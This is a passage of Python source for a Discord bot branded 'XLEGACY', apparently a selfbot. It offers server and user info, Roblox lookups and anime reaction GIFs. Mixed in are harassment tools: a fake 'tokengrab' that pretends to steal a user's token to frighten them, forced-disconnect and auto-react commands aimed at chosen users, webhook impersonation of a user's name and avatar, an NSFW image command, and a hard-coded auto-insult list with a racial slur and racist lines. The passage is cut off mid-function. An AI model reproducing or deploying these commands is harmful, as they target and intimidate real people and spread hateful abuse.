    response = fr"""```ansi
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Server Name: {white}{server.name}
                                {red}Created On: {white}{formatted_creation}
                                {red}Owner: {owner_field}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Members:
{members_field}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Channels:
{channels_field}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Other:
{roles_field}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Information:
{information_field}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
```"""
    await ctx.send(response)

@bot.command(aliases=['ui', 'whois'])
async def userinfo(ctx, member: discord.Member = None):
    if not member:
        member = ctx.author

    try:
        member = await ctx.guild.fetch_member(member.id)
        user_field = f"{white}{member.name}\n                                {red}ID: {white}{member.id}"
    except Exception as e:
        user_field = f"Error fetching user: {str(e)}"
        print(f"{light_red}Error fetching user info for {member.name}: {e}{reset}")

    creation_date = member.created_at
    formatted_creation = f"{creation_date.strftime('%Y-%m-%d')} (Created {time_since(creation_date)})"

    joined_date = member.joined_at.strftime('%Y-%m-%d') if member.joined_at else "N/A"
   
    response = fr"""```ansi
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}User Name: {white}{member.name}
                                {red}User ID: {white}{member.id}
                                {red}Created On: {white}{formatted_creation}
                                {red}Joined On: {white}{joined_date}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
```"""
    await ctx.send(response)

@bot.command(aliases=['emojisteal'])
async def steal(ctx, emoji: str, name: str = "xlegacy"):
    custom_emoji_match = re.match(r'<(a)?:\w+:(\d+)>', emoji)
    
    if custom_emoji_match:
        is_animated = bool(custom_emoji_match.group(1))
        emoji_id = custom_emoji_match.group(2)
        emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{'gif' if is_animated else 'png'}"

        async with aiohttp.ClientSession() as session:
            async with session.get(emoji_url) as response:
                if response.status == 200:
                    emoji_data = await response.read()
                    guild = ctx.guild
                    try:
                        new_emoji = await guild.create_custom_emoji(name=name, image=emoji_data)
                        await ctx.send(f"```ansi\n{red} XLEGACY | EMOJI STOLEN | {new_emoji.name} |  {reset}\n```")
                    except discord.Forbidden:
                        await ctx.send(f"```ansi\n{red} XLEGACY | NO PERMISSION TO ADD EMOJIS |  {reset}\n```")
                    except discord.HTTPException:
                        await ctx.send(f"```ansi\n{red} XLEGACY | EMOJI LIMIT REACHED |  {reset}\n```")
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID EMOJI |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | MISSING EMOJI |  {reset}\n```")

@bot.command()
async def tokengrab(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author

    loading_message = await ctx.send(f"```ansi\n{red} XLEGACY | TOKEN GRAB STARTED | {user.display_name} |  {reset}\n```")
    
    for i in range(6):
        dots = "." * (i + 1)
        await loading_message.edit(content=f"```ansi\n{red} XLEGACY | PROCESSING{dots} | {user.display_name} |  {reset}\n```")
        await asyncio.sleep(1)
    
    user_id_str = str(user.id)
    encoded_user_id = base64.b64encode(user_id_str.encode()).decode()
    
    await loading_message.edit(content=f"```ansi\n{red} XLEGACY | TOKEN GRAB COMPLETE | {user.display_name} |  {reset}\n\n{light_red}HAHA GOT EM: {white}{encoded_user_id}{reset}```")

@bot.command()
async def forcedc(ctx, action: str, user: discord.Member = None):
    if action not in ['toggle', 'list', 'clear']:
        await ctx.send(f"```ansi\n{red} XLEGACY | USAGE: .forcedc <toggle/list/clear> |  {reset}\n```")
        return

    if action == 'toggle':
        if user is None:
            user = ctx.author

        if user.id not in forced_disconnections:
            forced_disconnections[user.id] = user
            await ctx.send(f"```ansi\n{red} XLEGACY | FORCED DC ENABLED | {user.display_name} |  {reset}\n```")
        else:
            del forced_disconnections[user.id]
            await ctx.send(f"```ansi\n{red} XLEGACY | FORCED DC DISABLED | {user.display_name} |  {reset}\n```")

    elif action == 'list':
        if forced_disconnections:
            user_list = ', '.join([f"<@{user_id}>" for user_id in forced_disconnections.keys()])
            await ctx.send(f"```ansi\n{red} XLEGACY | FORCED DC USERS | {user_list} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO FORCED DC USERS |  {reset}\n```")

    elif action == 'clear':
        forced_disconnections.clear()
        await ctx.send(f"```ansi\n{red} XLEGACY | ALL FORCED DC CLEARED |  {reset}\n```")

@bot.command()
async def dreact(ctx, user: discord.User, *emojis):
    if not emojis:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE EMOJIS |  {reset}\n```")
        return
        
    dreact_users[user.id] = [list(emojis), 0]
    await ctx.send(f"```ansi\n{red} XLEGACY | DREACT ENABLED | {len(emojis)} EMOJIS | {user.name} |  {reset}\n```")

@bot.command()
async def dreactoff(ctx, user: discord.User):
    if user.id in dreact_users:
        del dreact_users[user.id]
        await ctx.send(f"```ansi\n{red} XLEGACY | DREACT DISABLED | {user.name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO DREACT FOUND | {user.name} |  {reset}\n```")

@bot.command()
async def webhookcopy(ctx):
    avatar_url = str(ctx.author.avatar_url) if ctx.author.avatar else str(ctx.author.default_avatar_url)

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_url) as response:
            if response.status == 200:
                avatar_data = io.BytesIO(await response.read())
                webhook = await ctx.channel.create_webhook(name=ctx.author.display_name, avatar=avatar_data.read())
                
                webhook_urls[ctx.author.id] = webhook.url
                webhookcopy_status[ctx.author.id] = True
                
                await ctx.send(f"```ansi\n{red} XLEGACY | WEBHOOK CREATED | COPYING ENABLED |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH AVATAR |  {reset}\n```")

@bot.command()
async def webhookcopyoff(ctx):
    webhookcopy_status[ctx.author.id] = False
    await ctx.send(f"```ansi\n{red} XLEGACY | WEBHOOK COPY DISABLED |  {reset}\n```")

@bot.command(aliases=['av', 'pfp'])
async def avatar(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author

    avatar_url = str(user.avatar_url_as(format='gif' if user.is_avatar_animated() else 'png'))
    await ctx.send(f"```ansi\n{red} XLEGACY | AVATAR | {user.name} |  {reset}\n```\n{avatar_url}")

@bot.command()
async def tempchannel(ctx, name: str = "xlegacy", duration: int = 5, unit: str = 'm'):
    time_multiplier = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}

    if unit not in time_multiplier:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID TIME UNIT | USE s/m/h/d |  {reset}\n```")
        return

    total_seconds = duration * time_multiplier[unit]
    channel = await ctx.guild.create_text_channel(name)
    await ctx.send(f"```ansi\n{red} XLEGACY | TEMP CHANNEL CREATED | {name} | {duration}{unit} |  {reset}\n```")
    await asyncio.sleep(total_seconds)
    await channel.delete()
    await ctx.send(f"```ansi\n{red} XLEGACY | TEMP CHANNEL DELETED | {name} |  {reset}\n```")

@bot.command()
async def createchannel(ctx, name: str = "xlegacy"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_text_channel(name)
        await ctx.send(f"```ansi\n{red} XLEGACY | CHANNEL CREATED | {name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PERMISSION |  {reset}\n```")

@bot.command()
async def createvc(ctx, name: str = "xlegacy VC"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_voice_channel(name)
        await ctx.send(f"```ansi\n{red} XLEGACY | VOICE CHANNEL CREATED | {name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PERMISSION |  {reset}\n```")

@bot.command()
async def createrole(ctx, *, name: str = "XLEGACY role"):
    guild = ctx.guild
    try:
        role = await guild.create_role(name=name)
        await ctx.send(f"```ansi\n{red} XLEGACY | ROLE CREATED | {role.name} |  {reset}\n```")
    except discord.Forbidden:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO PERMISSION |  {reset}\n```")
    except discord.HTTPException as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {e} |  {reset}\n```")

@bot.command()
async def tempvc(ctx, name: str = "xlegacy VC", duration: int = 5, unit: str = 'm'):
    time_multiplier = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}

    if unit not in time_multiplier:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID TIME UNIT | USE s/m/h/d |  {reset}\n```")
        return

    total_seconds = duration * time_multiplier[unit]
    channel = await ctx.guild.create_voice_channel(name)
    await ctx.send(f"```ansi\n{red} XLEGACY | TEMP VOICE CREATED | {name} | {duration}{unit} |  {reset}\n```")
    await asyncio.sleep(total_seconds)
    await channel.delete()
    await ctx.send(f"```ansi\n{red} XLEGACY | TEMP VOICE DELETED | {name} |  {reset}\n```")
@bot.command()
async def roblox(ctx, *, username: str):
    async with ctx.typing():
        # Search for user
        user_search_url = "https://users.roblox.com/v1/usernames/users"
        response = requests.post(user_search_url, json={"usernames": [username]})

        if response.status_code != 200:
            await ctx.send(f"```ansi\n{red} XLEGACY | ROBLOX ERROR | {response.status_code} |  {reset}\n```")
            return

        user_data = response.json()
        if 'data' not in user_data or len(user_data['data']) == 0:
            await ctx.send(f"```ansi\n{red} XLEGACY | USER NOT FOUND | {username} |  {reset}\n```")
            return

        roblox_user = user_data['data'][0]
        roblox_id = roblox_user.get('id')
        roblox_name = roblox_user.get('name', "Unknown User")
        roblox_display_name = roblox_user.get('displayName', roblox_name)

        # Get user info
        user_info_url = f"https://users.roblox.com/v1/users/{roblox_id}"
        user_info_response = requests.get(user_info_url)

        if user_info_response.status_code != 200:
            await ctx.send(f"```ansi\n{red} XLEGACY | USER INFO ERROR |  {reset}\n```")
            return

        user_info = user_info_response.json()
        roblox_bio = user_info.get('description', "No bio available")
        created_at = user_info.get('created', None)
        
        # Get follower count
        follower_count_url = f"https://friends.roblox.com/v1/users/{roblox_id}/followers/count"
        follower_response = requests.get(follower_count_url)
        follower_count = follower_response.json().get('count', 0) if follower_response.status_code == 200 else 0
        
        # Get following count
        following_count_url = f"https://friends.roblox.com/v1/users/{roblox_id}/followings/count"
        following_response = requests.get(following_count_url)
        following_count = following_response.json().get('count', 0) if following_response.status_code == 200 else 0

        # Get avatar image
        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={roblox_id}&width=420&height=420&format=png"
        
        # Get presence status
        presence_url = "https://presence.roblox.com/v1/presence/users"
        presence_response = requests.post(presence_url, json={"userIds": [roblox_id]})
        
        presence_status = "Offline"
        if presence_response.status_code == 200:
            presence_data = presence_response.json()
            if presence_data['userPresences']:
                user_presence = presence_data['userPresences'][0]
                presence_types = ["Offline", "Online", "In Game", "In Studio"]
                presence_status = presence_types[user_presence.get('userPresenceType', 0)]

        # Format creation date
        if created_at:
            created_date = datetime.fromisoformat(created_at.replace('Z', '+00:00'))
            formatted_date = created_date.strftime('%Y-%m-%d')
            time_ago = time_since(created_date)
        else:
            formatted_date = "Unknown"
            time_ago = "Unknown"

        # Create embed-like message with avatar
        response_text = fr"""```ansi
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}Roblox User: {white}{roblox_display_name} (@{roblox_name})
                                {red}User ID: {white}{roblox_id}
                                {red}Created: {white}{formatted_date} ({time_ago})
                                {red}Status: {white}{presence_status}
                                {red}Followers: {white}{follower_count}
                                {red}Following: {white}{following_count}
                                {red}Bio: {white}{roblox_bio[:80]}{'...' if len(roblox_bio) > 80 else ''}


{black}
  __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                   
                                                   

{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
```"""

        # Send the avatar image along with the info
    await ctx.send(response_text)
    await ctx.send(f"**Avatar:** {avatar_url}")
async def fetch_anime_gif(action):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.waifu.pics/sfw/{action}") as r:
            if r.status == 200:
                data = await r.json()
                return data.get('url')
    return None

@bot.command()
async def fun(ctx):
    msg = await ctx.send("Loading.")
    help_content = fr"""
{red}Anime Interaction Commands{reset}
{light_red}[ {red}1{light_red} ] {black}kiss <@user>       {light_red}[ {red}2{light_red} ] {black}slap <@user>       {light_red}[ {red}3{light_red} ] {black}hurt <@user>
{light_red}[ {red}4{light_red} ] {black}pat <@user>        {light_red}[ {red}5{light_red} ] {black}wave <@user>       {light_red}[ {red}6{light_red} ] {black}hug <@user>
{light_red}[ {red}7{light_red} ] {black}cuddle <@user>     {light_red}[ {red}8{light_red} ] {black}lick <@user>       {light_red}[ {red}9{light_red} ] {black}bite <@user>
{light_red}[ {red}10{light_red} ] {black}bully <@user>     {light_red}[ {red}11{light_red} ] {black}poke <@user>       {light_red}[ {red}12{light_red} ] {black}highfive <@user>
{light_red}[ {red}13{light_red} ] {black}handhold <@user>  {light_red}[ {red}14{light_red} ] {black}nom <@user>        {light_red}[ {red}15{light_red} ] {black}bonk <@user>
{light_red}[ {red}16{light_red} ] {black}yeet <@user>      {light_red}[ {red}17{light_red} ] {black}dance             {light_red}[ {red}18{light_red} ] {black}cry
{light_red}[ {red}19{light_red} ] {black}sleep             {light_red}[ {red}20{light_red} ] {black}blush             {light_red}[ {red}21{light_red} ] {black}wink
{light_red}[ {red}22{light_red} ] {black}smile             {light_red}[ {red}23{light_red} ] {black}smug              {light_red}[ {red}24{light_red} ] {black}ero <@user>

{light_red}
  __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                  
"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")

# Interaction commands with users
@bot.command(name="kiss")
async def kiss(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO KISS |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("kiss")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} KISSES {member.display_name} |  {reset}\n```\n[Kiss GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH KISS GIF |  {reset}\n```")

@bot.command(name="slap")
async def slap(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO SLAP |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("slap")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SLAPS {member.display_name} |  {reset}\n```\n[Slap GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH SLAP GIF |  {reset}\n```")

@bot.command(name="hurt")
async def hurt(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO HURT |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("kill")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} HURTS {member.display_name} |  {reset}\n```\n[Hurt GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH HURT GIF |  {reset}\n```")

@bot.command(name="pat")
async def pat(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO PAT |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("pat")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} PATS {member.display_name} |  {reset}\n```\n[Pat GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH PAT GIF |  {reset}\n```")

@bot.command(name="wave")
async def wave(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO WAVE AT |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("wave")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} WAVES AT {member.display_name} |  {reset}\n```\n[Wave GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH WAVE GIF |  {reset}\n```")

@bot.command(name="hug")
async def hug(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO HUG |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("hug")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} HUGS {member.display_name} |  {reset}\n```\n[Hug GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH HUG GIF |  {reset}\n```")

@bot.command(name="cuddle")
async def cuddle(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO CUDDLE |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("cuddle")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} CUDDLES {member.display_name} |  {reset}\n```\n[Cuddle GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH CUDDLE GIF |  {reset}\n```")

@bot.command(name="lick")
async def lick(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO LICK |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("lick")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} LICKS {member.display_name} |  {reset}\n```\n[Lick GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH LICK GIF |  {reset}\n```")

@bot.command(name="bite")
async def bite(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO BITE |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("bite")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} BITES {member.display_name} |  {reset}\n```\n[Bite GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH BITE GIF |  {reset}\n```")

@bot.command(name="bully")
async def bully(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO BULLY |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("bully")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} BULLIES {member.display_name} |  {reset}\n```\n[Bully GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH BULLY GIF |  {reset}\n```")

@bot.command(name="poke")
async def poke(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO POKE |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("poke")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} POKES {member.display_name} |  {reset}\n```\n[Poke GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH POKE GIF |  {reset}\n```")

@bot.command(name="highfive")
async def highfive(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO HIGH-FIVE |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("highfive")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} HIGH-FIVES {member.display_name} |  {reset}\n```\n[Highfive GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH HIGH-FIVE GIF |  {reset}\n```")

@bot.command(name="handhold")
async def handhold(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO HOLD HANDS WITH |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("handhold")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} HOLDS HANDS WITH {member.display_name} |  {reset}\n```\n[Handhold GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH HANDHOLD GIF |  {reset}\n```")

@bot.command(name="nom")
async def nom(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO NOM |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("nom")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} NOMS {member.display_name} |  {reset}\n```\n[Nom GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH NOM GIF |  {reset}\n```")

@bot.command(name="bonk")
async def bonk(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO BONK |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("bonk")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} BONKS {member.display_name} |  {reset}\n```\n[Bonk GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH BONK GIF |  {reset}\n```")

@bot.command(name="yeet")
async def yeet(ctx, member: discord.Member = None):
    if not member:
        await ctx.send(f"```ansi\n{red} XLEGACY | MENTION SOMEONE TO YEET |  {reset}\n```")
        return

    gif_url = await fetch_anime_gif("yeet")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} YEETS {member.display_name} |  {reset}\n```\n[Yeet GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH YEET GIF |  {reset}\n```")

# Solo interaction commands
@bot.command(name="dance")
async def dance(ctx):
    gif_url = await fetch_anime_gif("dance")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} DANCES |  {reset}\n```\n[Dance GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH DANCE GIF |  {reset}\n```")

@bot.command(name="cry")
async def cry(ctx):
    gif_url = await fetch_anime_gif("cry")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} CRIES |  {reset}\n```\n[Cry GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH CRY GIF |  {reset}\n```")

@bot.command(name="sleep")
async def sleep(ctx):
    gif_url = await fetch_anime_gif("sleep")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SLEEPS |  {reset}\n```\n[Sleep GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH SLEEP GIF |  {reset}\n```")

@bot.command(name="blush")
async def blush(ctx):
    gif_url = await fetch_anime_gif("blush")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} BLUSHES |  {reset}\n```\n[Blush GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH BLUSH GIF |  {reset}\n```")

@bot.command(name="wink")
async def wink(ctx):
    gif_url = await fetch_anime_gif("wink")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} WINKS |  {reset}\n```\n[Wink GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH WINK GIF |  {reset}\n```")

@bot.command(name="smile")
async def smile(ctx):
    gif_url = await fetch_anime_gif("smile")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SMILES |  {reset}\n```\n[Smile GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH SMILE GIF |  {reset}\n```")

@bot.command(name="smug")
async def smug(ctx):
    gif_url = await fetch_anime_gif("smug")
    if gif_url:
        await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} IS SMUG |  {reset}\n```\n[Smug GIF]({gif_url})")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH SMUG GIF |  {reset}\n```")

@bot.command(name="ero")
async def ero(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=ero&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                target = f" {member.display_name}" if member else ""
                await ctx.send(f"```ansi\n{red} XLEGACY | {ctx.author.display_name} SHARES ERO CONTENT{target} |  {reset}\n```\n[Ero Image]({image_url})")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO FETCH ERO IMAGE |  {reset}\n```")


# Add these to your global variables
ping_responses = {}
insults_enabled = False
autoinsults = [
    "your a skid", "stfu", "your such a loser", "fuck up boy", "no.",
    "why are you a bitch", "nigga you stink", "idk you", 
    "LOLSSOL WHO ARE YOUa", "stop pinging me boy", "if your black stfu"
]
reactions_enabled = False
custom_reaction = "😜"
fake_activity_active = False
tokenss = []
mcountdown_active = False
countdown_active = False
forced_nicknames = {}
force_delete_users = {}

@bot.command()
async def leavegroups(ctx):
    left_count = 0
    for channel in ctx.bot.private_channels:
        if isinstance(channel, discord.GroupChannel):
            try:
                await channel.leave()
                left_count += 1
            except discord.HTTPException as e:
                await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO LEAVE GROUP | {e} |  {reset}\n```")

    if left_count > 0:
        await ctx.send(f"```ansi\n{red} XLEGACY | LEFT {left_count} GROUPS |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO GROUPS FOUND |  {reset}\n```")

@bot.command()
async def firstmessage(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel  
    try:
        first_message = await channel.history(limit=1, oldest_first=True).flatten()
        if first_message:
            msg = first_message[0]  
            await msg.reply(f"```ansi\n{red} XLEGACY | FIRST MESSAGE |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO MESSAGES FOUND |  {reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | ERROR: {str(e)} |  {reset}\n```")

@bot.command()
async def pingresponse(ctx, action: str, *, response: str = None):
    global ping_responses
    action = action.lower()

    if action == "toggle":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send(f"```ansi\n{red} XLEGACY | PING RESPONSE DISABLED |  {reset}\n```")
        else:
            if response:
                ping_responses[ctx.channel.id] = response
                await ctx.send(f"```ansi\n{red} XLEGACY | PING RESPONSE SET | {response} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE RESPONSE |  {reset}\n```")
    
    elif action == "list":
        if ctx.channel.id in ping_responses:
            await ctx.send(f"```ansi\n{red} XLEGACY | PING RESPONSE | {ping_responses[ctx.channel.id]} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO PING RESPONSE SET |  {reset}\n```")
    
    elif action == "clear":
        if ctx.channel.id in ping_responses:
            del ping_responses[ctx.channel.id]
            await ctx.send(f"```ansi\n{red} XLEGACY | PING RESPONSE CLEARED |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO PING RESPONSE TO CLEAR |  {reset}\n```")
    
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")

@bot.command(name="pinginsult")
async def pinginsult(ctx, action: str = None, *, insult: str = None):
    global insults_enabled

    if action is None:
        await ctx.send(f"```ansi\n{red} XLEGACY | SPECIFY ACTION | TOGGLE/LIST/CLEAR |  {reset}\n```")
        return

    if action.lower() == "toggle":
        insults_enabled = not insults_enabled  
        status = "ENABLED" if insults_enabled else "DISABLED"
        await ctx.send(f"```ansi\n{red} XLEGACY | PING INSULTS {status} |  {reset}\n```")

    elif action.lower() == "list":
        if autoinsults:
            insult_list = "\n".join(f"- {insult}" for insult in autoinsults)
            await ctx.send(f"```ansi\n{red} XLEGACY | PING INSULTS LIST |  {reset}\n\n{insult_list}```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO INSULTS FOUND |  {reset}\n```")

    elif action.lower() == "clear":
        autoinsults.clear()
        await ctx.send(f"```ansi\n{red} XLEGACY | PING INSULTS CLEARED |  {reset}\n```")

    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")

@bot.command(name="pingreact")
async def pingreact(ctx, action: str = None, reaction: str = None):
    global reactions_enabled, custom_reaction

    if action is None:
        await ctx.send(f"```ansi\n{red} XLEGACY | SPECIFY ACTION | TOGGLE/LIST/CLEAR |  {reset}\n```")
        return

    if action.lower() == "toggle":
        if reaction:
            custom_reaction = reaction  
